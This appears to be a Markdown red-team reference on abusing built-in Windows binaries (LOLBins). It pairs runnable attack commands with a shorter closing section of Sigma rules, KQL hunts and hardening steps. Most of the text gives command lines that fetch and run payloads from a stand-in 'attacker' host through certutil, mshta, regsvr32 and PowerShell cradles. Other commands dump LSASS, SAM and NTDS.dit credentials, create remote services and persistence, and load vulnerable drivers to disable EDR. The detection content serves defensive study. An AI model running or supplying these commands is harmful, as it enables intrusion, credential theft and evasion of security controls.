# Living Off the Land - LOLBins, LOLBAs, LOLScripts


## 🎯 Purpose
LOLBins and LOLBAs reference - legitimate Windows binaries, libraries, and scripts that can be abused for execution, download, lateral movement, and defense evasion without dropping traditional malware.

## ⚙️ Function
Covers key LOLBins by capability category: execution (mshta, wscript, regsvr32, certutil), download (certutil, bitsadmin, powershell), lateral movement (wmic, psexec equivalents), persistence (schtasks, reg), and application control bypass - with detection guidance for each.

## 🏆 Goal
Enable defenders to build application allowlist policies and detection rules that flag LOLBin abuse; give red teamers an operational reference for chaining LOLBins when traditional malware would be detected.

## 📋 When to Use
- Red team: chaining living-off-the-land techniques in an environment with strict EDR/AV
- Blue team: building AppLocker/WDAC policies to restrict LOLBin abuse
- Detection engineering: creating Sigma rules for LOLBin behavioral patterns
- Purple team: testing which LOLBin executions fire EDR alerts

> **Scope:** Using legitimate Windows binaries, libraries, and scripts for offensive operations. Includes enumeration, execution, download, lateral movement, and detection/hunting guidance.

✅ **Quick-reference checklists:** [AppLocker Bypass](../Checklists/AppLocker.md) · [Environment Breakout](../Checklists/Environment-Breakout-Checklist.md)

---

## Table of Contents

1. [What is LOLB?](#what-is-lolb)
2. [Execution Techniques](#execution-techniques)
3. [Download & Transfer](#download--transfer)
4. [Lateral Movement](#lateral-movement)
5. [Persistence via LOLBins](#persistence-via-lolbins)
6. [Credential Harvesting](#credential-harvesting)
7. [Reconnaissance LOLBins](#reconnaissance-lolbins)
8. [LOLDrivers](#loldrivers)
9. [Detection & Hunting](#detection--hunting)
10. [Defensive Controls](#defensive-controls)

---

## 🎯 Purpose
A curated, execution-flow-organized walkthrough of Windows LOLBins/LOLBAs - where the [LOLBAS Project](https://lolbas-project.github.io/) is an exhaustive per-binary catalog, this file organizes the same technique space by attacker goal (execution, download, lateral movement, persistence, credential access) so it maps directly onto an engagement's kill chain.

## ⚙️ Function
Covers what LOLBins are, then sections by offensive goal (execution, download/transfer, lateral movement, persistence, credential harvesting, recon) plus a dedicated LOLDrivers section, closing with detection/hunting and defensive controls. Pairs with the [AppLocker Bypass](../Checklists/AppLocker.md) and [Environment Breakout](../Checklists/Environment-Breakout-Checklist.md) quick-reference checklists; differs from [av-edr-evasion.md](av-edr-evasion.md), which covers evading detection generally rather than specifically abusing trusted signed binaries.

## 🏆 Goal
An operator can complete a full attack chain using only signed/trusted Windows binaries (minimizing custom-tool detection surface), and a defender can build detections for that same abuse.

## 📋 When to Use
When an engagement requires allowlist/AppLocker bypass, or when building detection logic for living-off-the-land abuse on the defensive side.

## What is LOLB?

Living Off the Land Binaries and Scripts (LOLBins/LOLBAs) are Microsoft-signed executables, DLLs, and scripts built into Windows that can be abused for malicious purposes.

**Why they're effective:**
- Already present on every Windows system
- Signed by Microsoft - trusted by most AV/allowlisting solutions
- Whitelisted in many environments
- Blend into normal administrative activity

**Resources:**
- [LOLBAS Project](https://lolbas-project.github.io/) - comprehensive catalog
- [GTFOBins](https://gtfobins.org/) - Linux equivalents

---

## Execution Techniques

### certutil.exe

```cmd
:: Execute encoded payload
certutil -decode encoded.b64 payload.exe && payload.exe

:: Decode base64 inline
certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\p.exe

:: Alternative: use certutil to decode a locally staged file
certutil -decode C:\Windows\Temp\encoded.txt C:\Windows\Temp\shell.exe
```

### mshta.exe

```cmd
:: Execute remote HTA
mshta.exe http://attacker/payload.hta

:: Execute inline VBScript
mshta.exe vbscript:Close(Execute("GetObject(""script:http://attacker/payload.sct"")"))

:: Execute from file
mshta.exe C:\Windows\Temp\payload.hta
```

### rundll32.exe

```cmd
:: Load and execute a DLL export
rundll32.exe payload.dll,EntryPoint

:: Execute JavaScript via mshtml
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/payload.sct")

:: Load via URL (legacy)
rundll32.exe url.dll,OpenURL http://attacker/payload.hta
```

### regsvr32.exe (Squiblydoo)

```cmd
:: Execute remote scriptlet - bypasses AppLocker in script rules
regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll

:: Local execution
regsvr32.exe /s /n /u /i:C:\Windows\Temp\payload.sct scrobj.dll
```

### wmic.exe

```cmd
:: Execute local binary
wmic.exe process call create "C:\Windows\Temp\payload.exe"

:: Remote execution (requires creds)
wmic.exe /node:TARGET /user:DOMAIN\User /password:Pass process call create "cmd.exe /c payload.exe"

:: XSL script execution (WMIC + XSL bypass)
wmic.exe os get /format:"http://attacker/payload.xsl"
```

### msiexec.exe

```cmd
:: Install remote MSI
msiexec.exe /q /i http://attacker/payload.msi

:: Execute DLL via MSI
msiexec.exe /y C:\Windows\Temp\payload.dll

:: Silent install from local file
msiexec.exe /quiet /i C:\Windows\Temp\payload.msi
```

### installutil.exe

```cmd
:: Execute .NET assembly via InstallUtil (bypasses AppLocker)
installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.exe

:: Works because InstallUtil calls [RunInstaller] attribute methods
```

### cmstp.exe

```cmd
:: Execute via CMSTP INF file (UAC bypass + AppLocker bypass)
cmstp.exe /s /ns C:\Windows\Temp\payload.inf
```

### pcalua.exe

```cmd
:: Execute arbitrary file via Program Compatibility Assistant
pcalua.exe -a C:\Windows\Temp\payload.exe
pcalua.exe -a \\attacker\share\payload.exe
```

### forfiles.exe

```cmd
:: Execute via forfiles (bypasses some script controls)
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Windows\Temp\payload.exe"
```

### csc.exe / vbc.exe

```cmd
:: Compile and execute C# source from disk
csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
C:\Windows\Temp\payload.exe

:: Compile to DLL for injection
csc.exe /target:library /out:C:\Windows\Temp\payload.dll C:\Windows\Temp\payload.cs
```

### PowerShell Execution Bypasses

```powershell
# Bypass ExecutionPolicy
powershell -ExecutionPolicy Bypass -File payload.ps1
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# Encoded command
powershell -EncodedCommand <base64_payload>

# Constrained Language Mode bypass (various methods)
# CLM prevents certain operations - test your target environment
```

---

## Download & Transfer

### certutil.exe

```cmd
certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe
```

### bitsadmin.exe

```cmd
:: Background Intelligent Transfer Service
bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\Windows\Temp\payload.exe

:: Cleaner syntax
bitsadmin /create job
bitsadmin /addfile job http://attacker/payload.exe C:\Windows\Temp\payload.exe
bitsadmin /resume job
bitsadmin /complete job
```

### PowerShell

```powershell
# WebClient
(New-Object Net.WebClient).DownloadFile('http://attacker/payload.exe','C:\Windows\Temp\p.exe')

# WebRequest (PS 3.0+)
Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile C:\Windows\Temp\p.exe

# Cradle via IEX (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
```

### expand.exe

```cmd
:: Download and expand cabinet file
expand \\attacker\share\payload.cab -F:* C:\Windows\Temp\
```

### esentutl.exe

```cmd
:: Copy file via ESE database utility
esentutl.exe /y \\attacker\share\payload.exe /d C:\Windows\Temp\payload.exe /o
```

### finger.exe (legacy)

```cmd
:: Encode payload in finger query response
finger user@attacker.com
```

### desktopimgdownldr.exe

```cmd
:: Download file to predictable location (Windows 10)
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://attacker/payload.exe /eventName:desktopimgdownldr
```

---

## Lateral Movement

### psexec.exe (Sysinternals)

```cmd
:: Remote execution (requires admin share access)
psexec.exe \\TARGET -u DOMAIN\User -p Pass cmd.exe
psexec.exe \\TARGET -u DOMAIN\User -p Pass -d -c payload.exe

:: Using current session token
psexec.exe \\TARGET cmd.exe
```

### wmic.exe

```cmd
:: Remote process creation
wmic.exe /node:TARGET process call create "cmd.exe /c payload.exe"
```

### winrs.exe

```cmd
:: Windows Remote Shell (WinRM)
winrs.exe -r:TARGET -u:DOMAIN\User -p:Pass "cmd.exe /c payload.exe"
```

### sc.exe

```cmd
:: Create and start a remote service
sc.exe \\TARGET create evilsvc binPath= "C:\Windows\Temp\payload.exe"
sc.exe \\TARGET start evilsvc

:: Cleanup
sc.exe \\TARGET delete evilsvc
```

### reg.exe

```cmd
:: Remote registry manipulation
reg.exe add \\TARGET\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\Windows\Temp\payload.exe"
```

### mstsc.exe / xfreerdp

```cmd
:: RDP with pass-the-hash (via RDP restricted admin mode)
mstsc.exe /restrictedAdmin /v:TARGET

:: xfreerdp PTH
xfreerdp /v:TARGET /u:User /pth:NTLM_HASH /d:DOMAIN
```

---

## Persistence via LOLBins

### schtasks.exe

```cmd
:: Create scheduled task
schtasks.exe /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc ONLOGON /ru SYSTEM /f

:: Remote scheduled task
schtasks.exe /create /s TARGET /u DOMAIN\User /p Pass /tn "Update" /tr "payload.exe" /sc DAILY

:: Run and delete
schtasks.exe /run /tn "WindowsUpdate"
schtasks.exe /delete /tn "WindowsUpdate" /f
```

### reg.exe

```cmd
:: Add to Run key
reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

:: Add to HKLM (requires elevation)
reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

### wmic.exe

```cmd
:: Create WMI event subscription (fileless persistence)
wmic.exe /namespace:\\root\subscription PATH __EventFilter CREATE Name="PersistFilter",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

---

## Credential Harvesting

### comsvcs.dll (LSASS Dump)

```cmd
:: Dump LSASS memory via comsvcs.dll MiniDump export
:: Requires SYSTEM or SeDebugPrivilege

:: Via Task Manager alternative (rundll32)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full

:: Via PowerShell
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\Windows\Temp\lsass.dmp full
```

### reg.exe (SAM/SYSTEM/SECURITY Dump)

```cmd
:: Extract registry hives for offline cracking
reg.exe save HKLM\SAM C:\Windows\Temp\sam.bak
reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak
reg.exe save HKLM\SECURITY C:\Windows\Temp\security.bak
```

### vssadmin / diskshadow (Shadow Copy Credential Access)

```cmd
:: Create shadow copy and copy NTDS.dit (Domain Controller)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\

:: Via diskshadow script
diskshadow.exe /s C:\Windows\Temp\shadow.txt
```

---

## Reconnaissance LOLBins

```cmd
:: Network discovery
net.exe view /domain
net.exe group "Domain Admins" /domain
net.exe user /domain

:: ARP table
arp.exe -a

:: Routing table
route.exe print

:: DNS cache (reveals recent lookups)
ipconfig.exe /displaydns

:: Shares
net.exe share
net.exe use

:: Logged on users (remote)
qwinsta.exe /server:TARGET

:: Service enumeration
sc.exe query type= all state= all

:: Firewall rules
netsh.exe advfirewall firewall show rule name=all

:: PowerShell discovery
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroupMember "Domain Admins"
```

---

## LOLDrivers

Vulnerable signed drivers can be used to execute code in kernel mode (BYOVD - Bring Your Own Vulnerable Driver).

**Common BYOVD Targets:**

| Driver | Vulnerability |
|---|---|
| gdrv.sys (Gigabyte) | Arbitrary kernel memory R/W |
| RTCore64.sys (MSI Afterburner) | Arbitrary kernel memory R/W |
| dbutil_2_3.sys (Dell) | Arbitrary kernel memory R/W |
| iqvw64e.sys (Intel) | Arbitrary kernel memory R/W |

**Usage pattern:**
1. Drop vulnerable signed driver to disk
2. Load driver via `sc.exe create` or `NtLoadDriver`
3. Communicate via IOCTL to perform privileged operations (disable EDR kernel callbacks, patch DSE)
4. Unload driver

**Resources:**
- [LOLDrivers Project](https://www.loldrivers.io/)
- [KDMapper](https://github.com/TheCruZ/kdmapper) - unsigned driver mapper using vulnerable driver

---

## Detection & Hunting

### High-Priority Process Relationships to Alert On

| Parent | Child | Suspicion |
|---|---|---|
| winword.exe / excel.exe | cmd.exe, powershell.exe, wscript.exe | Macro execution |
| mshta.exe | powershell.exe, cmd.exe | HTA payload |
| wmic.exe | cmd.exe, powershell.exe | WMIC execution |
| regsvr32.exe | (network connection) | Squiblydoo |
| svchost.exe | cmd.exe (unusual params) | Service abuse |
| explorer.exe | installutil.exe, cmstp.exe | LOLBin execution |

### Sigma Rules

```yaml
title: Suspicious certutil Usage
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
            - 'http'
    condition: selection
level: high

---

title: Regsvr32 Network Connection
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Image|endswith: '\regsvr32.exe'
        Initiated: 'true'
    condition: selection
level: high

---

title: LSASS Dump via comsvcs.dll
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains:
            - 'comsvcs'
            - 'MiniDump'
    condition: selection
level: critical
```

### PowerShell / Sysmon Event IDs

| Event ID | Source | Description |
|---|---|---|
| 4688 | Security | Process creation (enable command line logging) |
| 4103/4104 | PowerShell | Script block logging |
| 1 | Sysmon | Process creation with full command line |
| 3 | Sysmon | Network connection |
| 7 | Sysmon | Image loaded |
| 8 | Sysmon | CreateRemoteThread |
| 10 | Sysmon | ProcessAccess (LSASS access) |
| 11 | Sysmon | FileCreate |
| 12/13 | Sysmon | Registry create/modify |

### Hunting Queries (Defender for Endpoint / KQL)

```kusto
// Hunt for LSASS access by non-standard processes
DeviceEvents
| where ActionType == "LsassProcessAccess"
| where InitiatingProcessFileName !in ("MsMpEng.exe", "svchost.exe", "taskmgr.exe", "lsass.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine

// Hunt for LOLBin download activity
DeviceNetworkEvents
| where InitiatingProcessFileName in~ ("certutil.exe", "bitsadmin.exe", "mshta.exe", "regsvr32.exe")
| where RemotePort in (80, 443, 8080, 8443)
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteUrl
```

---

## Defensive Controls

### Application Control (WDAC / AppLocker)

```powershell
# Block known LOLBin abuse via WDAC path rules
# Example: Block regsvr32 from loading remote scriptlets
# Configure via Group Policy: Computer Config > Windows Settings > Security Settings > Application Control Policies

# Test WDAC policy with audit mode before enforcement
ConvertFrom-CIPolicy -XmlFilePath policy.xml -BinaryFilePath policy.p7b
CiTool --update-policy policy.p7b
```

### Block via Software Restriction

```cmd
:: Restrict access to specific LOLBins via GPO or ACLs
icacls.exe "C:\Windows\System32\mshta.exe" /deny "Everyone:(X)"
icacls.exe "C:\Windows\System32\regsvr32.exe" /deny "Everyone:(X)"
```

### PowerShell Hardening

```powershell
# Enable Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 1

# Enable Constrained Language Mode
[System.Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')

# Disable PowerShell v2 (removes AMSI bypass vector)
Disable-WindowsOptionalFeature -Online -FeatureName "MicrosoftWindowsPowerShellV2Root" -NoRestart
```

### ASR Rules (Attack Surface Reduction)

```powershell
# Block Office from creating child processes
Add-MpPreference -AttackSurfaceReductionRules_Ids "d4f940ab-401b-4efc-aadc-ad5f3c50688a" `
    -AttackSurfaceReductionRules_Actions Enabled

# Block JS/VBS from launching downloaded executable content
Add-MpPreference -AttackSurfaceReductionRules_Ids "3b576869-a4ec-4529-8536-b80a7769e899" `
    -AttackSurfaceReductionRules_Actions Enabled

# Block process creations originating from PSExec and WMI commands
Add-MpPreference -AttackSurfaceReductionRules_Ids "d1e49aac-8f56-4280-b9ba-993a6d77406c" `
    -AttackSurfaceReductionRules_Actions Enabled
```

---

## References

- [LOLBAS Project](https://lolbas-project.github.io/)
- [LOLDrivers](https://www.loldrivers.io/)
- [MITRE ATT&CK: Signed Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/)
- [Sigma Rules Repository](https://github.com/SigmaHQ/sigma)
- [Sysmon Configuration](https://github.com/SwiftOnSecurity/sysmon-config)
- [WDAC Policy Wizard](https://webapp-wdac-wizard.azurewebsites.net/)

## Related Files
- [README.md](README.md) - Tradecraft section index
- [av-edr-evasion.md](av-edr-evasion.md) - LOLBins as a component of broader evasion strategy
- [active-directory.md](active-directory.md) - LOLBins used in AD lateral movement
- [../Checklists/Defense-Evasion.md](../Checklists/Defense-Evasion.md) - Defense evasion checklist including LOLBin techniques
- [../Checklists/AppLocker.md](../Checklists/AppLocker.md) - AppLocker bypass checklist (complementary to this file)
